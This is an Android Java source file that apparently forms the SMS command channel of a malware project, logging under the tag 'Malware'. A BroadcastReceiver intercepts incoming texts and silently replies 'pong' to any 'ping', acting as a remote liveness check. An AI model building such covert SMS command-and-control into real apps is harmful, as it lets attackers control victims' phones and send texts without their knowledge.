package communication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsCanal extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {

		Log.w("Malware", "SMS received");

		final Bundle bundle = intent.getExtras();
		if (bundle == null)
			return;

		final Object[] pdus = (Object[]) bundle.get("pdus");

		for (int i = 0; i < pdus.length; i++) {
			SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdus[i]);

			String source = msg.getDisplayOriginatingAddress();
			String text = msg.getDisplayMessageBody();
			callBackAction(source, text);
		}
	}

	public void callBackAction(String source, String text) {
		// alive ?
		if (text.matches("ping")) {
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage(source, null, "pong", null, null);
		}
	}
}
